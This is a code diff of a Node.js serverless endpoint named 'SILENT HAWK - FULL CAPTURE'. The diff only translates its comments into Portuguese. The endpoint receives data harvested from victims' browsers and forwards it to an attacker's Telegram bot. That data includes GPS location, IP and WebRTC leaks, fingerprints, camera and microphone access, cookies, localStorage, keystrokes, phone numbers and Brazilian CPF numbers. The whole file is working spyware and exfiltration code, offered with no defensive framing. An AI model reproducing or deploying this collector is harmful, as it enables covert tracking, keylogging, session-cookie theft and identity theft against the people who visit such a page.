@@ -1,17 +1,18 @@
 const axios = require('axios');
 
-// Função para escapar caracteres Markdown
+// Função para escapar caracteres Markdown para evitar erros no Telegram
 function escapeMarkdown(text) {
     if (typeof text !== 'string') return text;
     return text.replace(/([_*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
 }
 
 module.exports = async (req, res) => {
-    // CORS headers
+    // CORS headers para permitir requisições de qualquer origem
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', '*');
     
+    // Responder imediatamente a requisições OPTIONS
     if (req.method === 'OPTIONS') {
         return res.status(200).end();
     }
@@ -30,7 +31,7 @@ module.exports = async (req, res) => {
             return res.status(400).json({ error: 'Método não suportado ou dados faltando' });
         }
 
-        // Build Telegram message with escaped Markdown
+        // Construir mensagem para Telegram com Markdown escapado
         let message = `🚨 *SILENT HAWK - FULL CAPTURE* 🚨\n\n`;
         message += `📱 *User Agent:* ${escapeMarkdown(data.userAgent || 'N/A')}\n`;
         message += `💻 *Platform:* ${escapeMarkdown(data.platform || 'N/A')}\n`;
@@ -41,7 +42,7 @@ module.exports = async (req, res) => {
         message += `🧠 *Device Memory:* ${escapeMarkdown(data.deviceMemory || 'N/A')}\n`;
         message += `⚡ *Hardware Concurrency:* ${escapeMarkdown(data.hardwareConcurrency || 'N/A')}\n`;
 
-        // Geolocation data
+        // Dados de geolocalização
         if (data.geolocation) {
             message += `\n📍 *GPS LOCATION:*\n`;
             message += `• Lat: ${escapeMarkdown(data.geolocation.latitude)}\n`;
@@ -54,7 +55,7 @@ module.exports = async (req, res) => {
             message += `\n❌ *Geolocation Error:* ${escapeMarkdown(data.geolocationError)}\n`;
         }
 
-        // IP triangulation
+        // Triangulação de IP
         if (data.ipLocation) {
             message += `\n🌍 *IP TRIANGULATION:*\n`;
             message += `• IP: ${escapeMarkdown(data.ipLocation.ip || data.ipLocation.query || 'N/A')}\n`;
@@ -64,7 +65,7 @@ module.exports = async (req, res) => {
             message += `• ISP: ${escapeMarkdown(data.ipLocation.org || data.ipLocation.isp || 'N/A')}\n`;
             message += `• ASN: ${escapeMarkdown(data.ipLocation.asn || 'N/A')}\n`;
             
-            // VPN Detection based on Time Zone comparison
+            // Detecção de VPN com base no fuso horário
             const ipTimeZone = data.ipLocation.timezone || data.ipLocation.time_zone || null;
             const browserTimeZone = data.timezone;
             if (ipTimeZone && browserTimeZone) {
@@ -78,7 +79,7 @@ module.exports = async (req, res) => {
             message += `\n❌ *IP Error:* ${escapeMarkdown(data.ipError)}\n`;
         }
 
-        // Fingerprinting data
+        // Dados de fingerprinting
         if (data.canvasFingerprint) {
             message += `\n🎨 *Canvas Fingerprint:* Collected\n`;
         }
@@ -95,7 +96,7 @@ module.exports = async (req, res) => {
             message += `• *Plugins:* ${escapeMarkdown(data.plugins.join(', '))}\n`;
         }
 
-        // Camera and audio access
+        // Acesso à câmera e áudio
         if (data.cameraCapture) {
             message += `\n📷 *Camera Access:* GRANTED\n`;
         } else if (data.cameraError) {
@@ -105,7 +106,7 @@ module.exports = async (req, res) => {
             message += `🎤 *Audio Access:* GRANTED\n`;
         }
 
-        // Network information
+        // Informações de rede
         if (data.connection) {
             message += `\n📡 *Network Info:*\n`;
             message += `• Type: ${escapeMarkdown(data.connection.type || 'N/A')}\n`;
@@ -114,7 +115,7 @@ module.exports = async (req, res) => {
             message += `• RTT: ${escapeMarkdown(data.connection.rtt || 'N/A')} ms\n`;
         }
 
-        // Cookies and localStorage
+        // Cookies e localStorage
         if (data.cookies) {
             message += `\n🍪 *Cookies:* ${escapeMarkdown(data.cookies.length > 100 ? data.cookies.substring(0, 100) + '...' : data.cookies)}\n`;
         }
@@ -122,7 +123,7 @@ module.exports = async (req, res) => {
             message += `💾 *Local Storage:* ${escapeMarkdown(data.localStorage.length > 100 ? data.localStorage.substring(0, 100) + '...' : data.localStorage)}\n`;
         }
 
-        // Keylogging data
+        // Keylogging
         if (data.keystrokes) {
             message += `\n⌨️ *Keystrokes Captured:* ${escapeMarkdown(data.keystrokes)}\n`;
         }
@@ -132,7 +133,7 @@ module.exports = async (req, res) => {
             message += `🌐 *WebRTC IP Leak:* ${escapeMarkdown(data.webrtcIP)}\n`;
         }
 
-        // Social Engineering Data
+        // Dados de engenharia social
         if (data.phone) {
             message += `📱 *Phone Number:* ${escapeMarkdown(data.phone)}\n`;
         }
@@ -140,7 +141,7 @@ module.exports = async (req, res) => {
             message += `🔢 *CPF:* ${escapeMarkdown(data.cpf)}\n`;
         }
 
-        // Send to Telegram
+        // Enviar para Telegram
         const token = process.env.TELEGRAM_BOT_TOKEN;
         const chatId = process.env.TELEGRAM_CHAT_ID;
 
